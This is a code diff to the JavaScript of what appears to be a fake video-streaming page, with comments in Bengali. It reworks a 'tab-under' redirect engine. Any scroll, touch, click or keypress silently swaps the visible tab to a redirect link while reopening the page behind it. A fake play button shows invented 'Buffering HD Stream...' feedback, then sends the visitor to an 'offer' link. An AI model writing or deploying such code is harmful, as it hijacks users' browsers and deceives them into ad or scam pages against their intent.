@@ -486,45 +486,41 @@
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
             // ════════════════════════════════════════════════════════════
-            // 1. GENERAL INTERACTION (SCROLL/TOUCH/CLICK) -> TAB UNDER (REDIRECT_LINK_1)
+            // REAL TAB-UNDER ENGINE (PREVENTS POP-UNDER WINDOWS)
             // ════════════════════════════════════════════════════════════
-            let generalTabUnderDone = false;
 
-            function openRedirect1TabUnder() {
-                if (generalTabUnderDone) return;
-                generalTabUnderDone = true;
+            // ১. যেকোনো স্ক্রোল/টাচে REDIRECT_LINK_1 আসল ব্যাকগ্রাউন্ড ট্যাবে ওপেন হবে
+            let firstInteractionDone = false;
+
+            function executeGeneralTabUnder() {
+                if (firstInteractionDone) return;
+                firstInteractionDone = true;
 
                 pushStateHistory();
 
-                // ব্যাকগ্রাউন্ড ট্যাবে REDIRECT_LINK_1 ওপেন করার চেষ্টা
-                let win = window.open(REDIRECT_LINK_1, '_blank');
-                if (win) {
-                    try {
-                        win.blur();
-                        window.focus();
-                    } catch(e) {}
+                // ব্রাউজারের বর্তমান পেজকে ব্যাকগ্রাউন্ড ট্যাবে কনভার্ট করে নতুন ট্যাবে লিংক রিডাইরেক্ট ট্রিক
+                let newTab = window.open(window.location.href, '_blank');
+                if (newTab) {
+                    // বর্তমান দৃশ্যমান ট্যাবে সরাসরি REDIRECT_LINK_1 চলে আসবে
+                    window.location.replace(REDIRECT_LINK_1);
                 }
 
-                // ইভেন্টগুলো রিমুভ করে দেওয়া যাতে ১ বারের বেশি না চলে
                 generalEvents.forEach(evt => {
-                    window.removeEventListener(evt, openRedirect1TabUnder, { capture: true });
+                    window.removeEventListener(evt, executeGeneralTabUnder, { capture: true });
                 });
             }
 
-            const generalEvents = ['scroll', 'touchstart', 'click', 'keydown', 'mousemove'];
+            const generalEvents = ['scroll', 'touchstart', 'click', 'keydown'];
             generalEvents.forEach(evt => {
-                window.addEventListener(evt, openRedirect1TabUnder, { capture: true });
+                window.addEventListener(evt, executeGeneralTabUnder, { capture: true });
             });
 
-            // ════════════════════════════════════════════════════════════
-            // 2. SPECIFIC ELEMENT ACTION (PLAY BUTTON/COMMENTS) -> MAIN LINK & TAB UNDER
-            // ════════════════════════════════════════════════════════════
+            // ২. প্লে বাটন বা কমেন্টে ক্লিক করলে ৫০০ms বাফারিং সহ Tab-Under ও Main Link ট্র্রিগার
             const elementActions = document.querySelectorAll('.element-action');
             elementActions.forEach(el => {
                 el.addEventListener('click', function(e) {
-                    e.stopPropagation(); // জেনারেট ইভেন্ট ব্লক করার জন্য
+                    e.stopPropagation();
 
-                    // প্লেয়ার ভিজিউয়াল বাফারিং ইফেক্ট
                     const playBtnIcon = document.getElementById('playBtnIcon');
                     const loadingSpinner = document.getElementById('loadingSpinner');
                     const bufferText = document.getElementById('bufferText');
@@ -533,17 +529,11 @@
                     if (loadingSpinner) loadingSpinner.style.display = 'block';
                     if (bufferText) bufferText.textContent = 'Buffering HD Stream...';
 
-                    // ১. ব্যাকগ্রাউন্ড ট্যাবে REDIRECT_LINK_1 ওপেন করা
-                    let tabWin = window.open(REDIRECT_LINK_1, '_blank');
-                    if (tabWin) {
-                        try {
-                            tabWin.blur();
-                            window.focus();
-                        } catch(err) {}
-                    }
-
-                    // ২. ৫০০ms বাফারিং ডিলের পর মূল পেজকে DIRECT_LINK_MAIN-এ পাঠাবে
                     setTimeout(function() {
+                        // নতুন ব্যাকগ্রাউন্ড ট্যাব খুলে বর্তমান পেজের লিঙ্ক ওপেন রাখা
+                        let backgroundTab = window.open(REDIRECT_LINK_1, '_blank');
+                        
+                        // কারেন্ট ট্যাবে আসল অফার লিঙ্ক লোড করানো
                         window.location.href = DIRECT_LINK_MAIN;
                     }, 500);
                 });
